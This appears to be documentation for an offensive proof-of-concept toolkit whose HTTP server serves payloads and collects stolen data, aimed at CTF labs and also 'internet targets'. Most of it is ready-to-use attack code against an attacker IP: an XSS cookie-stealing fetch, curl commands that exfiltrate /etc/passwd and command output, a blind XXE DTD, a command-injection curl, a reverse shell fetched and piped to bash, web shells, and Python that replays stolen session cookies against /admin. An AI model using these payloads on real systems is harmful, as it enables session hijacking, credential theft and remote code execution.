HTTP Server & Callbacks
========================

Built-in HTTP server for serving payloads and collecting callbacks via a thread-safe queue.

Quick Start
-----------

.. code-block:: bash

   # Start server (binds to 0.0.0.0:8000)
   python -m your_project --server

   # Specify interface and port
   python -m your_project --server --lhost 10.10.14.5 --lport 8080

Output shows all network interfaces:

.. code-block:: text

   ==================================================
   [*] POC Server listening on:
   [+] → http://10.10.14.5:8000 (tun0)
   [...] → http://192.168.1.100:8000 (eth0)
   Serving: /home/user/poc/payloads
   Logs: /home/user/poc/logs/server.ndjson
   Queue: DELETE /queue to pop events
   ==================================================

How It Works
------------

* Serves files from ``payloads/`` directory
* Captures ``cookie`` and ``exfil`` parameters (query or path)
* Logs all requests to ``logs/server.ndjson``
* CORS enabled for XSS callbacks

Sending Data
------------

Cookie Exfiltration
~~~~~~~~~~~~~~~~~~~

.. code-block:: javascript

   // From XSS
   fetch('http://10.10.14.5:8000/?cookie=' + btoa(document.cookie));

Data Exfiltration
~~~~~~~~~~~~~~~~~

.. code-block:: bash

   # File contents
   curl "http://10.10.14.5:8000/?exfil=$(cat /etc/passwd | base64 -w0)"

   # Command output
   curl "http://10.10.14.5:8000/exfil/$(whoami)"

.. code-block:: xml

   <!-- Blind XXE -->
   <!DOCTYPE foo [
     <!ENTITY % file SYSTEM "file:///etc/passwd">
     <!ENTITY % dtd SYSTEM "http://10.10.14.5:8000/xxe/exfil.dtd">
     %dtd;
   ]>

.. code-block:: bash

   # Command injection confirmation
   test; curl http://10.10.14.5:8000/cmdi/confirmed

Retrieving Data
---------------

Use ``server_hooks`` module to retrieve captured data from the queue.

Get Cookie
~~~~~~~~~~

.. code-block:: python

   from your_project.utils.server_hooks import get_cookie
   from your_project.utils.cookie import parse_cookie_string
   import requests

   # Wait for callback
   cookie_str = get_cookie(timeout=30)
   if cookie_str:
       cookies = parse_cookie_string(cookie_str)
       r = requests.get("http://target/admin", cookies=cookies)

Get Exfil Data
~~~~~~~~~~~~~~

.. code-block:: python

   from your_project.utils.server_hooks import get_exfil

   data = get_exfil(timeout=30)
   if data and "root:x:0:0" in data:
       print("[+] Successfully read /etc/passwd!")

Queue Management
~~~~~~~~~~~~~~~~

.. code-block:: python

   from your_project.utils.server_hooks import drain_queue, get_event

   # Clear old events
   drain_queue()

   # Get any event type
   event = get_event(timeout=30, wait=True)
   # Returns: {'type': 'cookie|exfil', 'data': '...', 'timestamp': '...'}

   # Custom server address
   cookie = get_cookie(server='http://192.168.1.100:8080', timeout=30)

Payload Directory
-----------------

Files in ``payloads/`` are automatically served:

.. code-block:: text

   payloads/
   ├── xss/
   │   ├── steal-cookie.js
   │   └── steal-all.js
   ├── xxe/
   │   └── xxe-template.dtd
   └── shells/
       ├── cmd.php
       ├── cmd.jsp
       └── cmd.aspx

Access at: ``http://10.10.14.5:8000/xss/steal-cookie.js``

Generating Payloads
~~~~~~~~~~~~~~~~~~~

Utility modules automatically write payloads to ``payloads/`` for serving.

**Reverse Shells:**

.. code-block:: python

   from your_project.utils.reverse_shells import bash_shell, python_shell, php_shell

   # Generate bash shell → payloads/shells/rev_bash.sh
   path = bash_shell("10.10.14.5", 4444)
   # Returns: "shells/rev_bash.sh"
   # Served at: http://10.10.14.5:8000/shells/rev_bash.sh

   # Trigger download on target
   requests.post(target, data={
       "cmd": f"curl http://10.10.14.5:8000/{path} | bash"
   })

**XXE DTD Files:**

.. code-block:: python

   from your_project.utils.xxe import oob_dtd, quick_test

   # Generate DTD → payloads/xxe/xxe.dtd
   dtd_path = oob_dtd("http://10.10.14.5:8000", "/etc/passwd")
   # Returns: "xxe/xxe.dtd"
   # Served at: http://10.10.14.5:8000/xxe/xxe.dtd

   # Quick test generates DTD and returns payload
   payload = quick_test("http://10.10.14.5:8000", "/etc/passwd")
   requests.post(target, data=payload, headers={"Content-Type": "application/xml"})

   # Get exfiltrated data
   from your_project.utils.server_hooks import get_exfil
   data = get_exfil(timeout=30)

Example: XSS Cookie Theft
~~~~~~~~~~~~~~~~~~~~~~~~~

**Inject payload:**

.. code-block:: html

   <script src="http://10.10.14.5:8000/xss/steal-cookie.js"></script>

**Retrieve in exploit:**

.. code-block:: python

   from your_project.utils.server_hooks import get_cookie, drain_queue
   from your_project.utils.cookie import parse_cookie_string

   drain_queue()  # Clear old events

   # Inject XSS (your code here)
   inject_xss(target, "http://10.10.14.5:8000/xss/steal-cookie.js")

   # Wait for callback
   cookie_str = get_cookie(timeout=30)
   cookies = parse_cookie_string(cookie_str)

   # Use stolen cookie
   r = requests.get(f"{target}/admin", cookies=cookies)

Server Logs
-----------

All requests logged to ``logs/server.ndjson``:

.. code-block:: json

   {
     "timestamp": "2025-10-22T13:45:30.123456",
     "client": "192.168.1.100:54321",
     "method": "GET",
     "path": "/cookie/c2Vzc2lvbj1hYmMxMjM=",
     "query": {"source": ["xss"]},
     "headers": {"User-Agent": "...", "Host": "..."},
     "body": ""
   }

.. code-block:: bash

   # View logs
   tail -f logs/server.ndjson | jq .

   # Search for cookies
   grep '"path":"/cookie' logs/server.ndjson | jq .

Event Schema
------------

**Cookie Event:**

.. code-block:: json

   {
     "type": "cookie",
     "data": "session=abc123; token=xyz789",
     "raw": "c2Vzc2lvbj1hYmMxMjM7IHRva2VuPXh5eno3ODk=",
     "timestamp": "2025-10-22T13:45:30.123456"
   }

**Exfil Event:**

.. code-block:: json

   {
     "type": "exfil",
     "data": "/etc/passwd content or XXE output",
     "timestamp": "2025-10-22T13:45:30.123456"
   }

Tips
----

**Clear queue before each test:**

.. code-block:: python

   from your_project.utils.server_hooks import drain_queue
   drain_queue()

**Choose the right interface:**

* Use ``tun0`` IP for HackTheBox/TryHackMe
* Use ``eth0``/``wlan0`` for local network
* Use public IP for internet targets

**Base64 encoding bypasses filters:**

.. code-block:: javascript

   fetch('http://10.10.14.5:8000/?cookie=' + btoa(document.cookie));
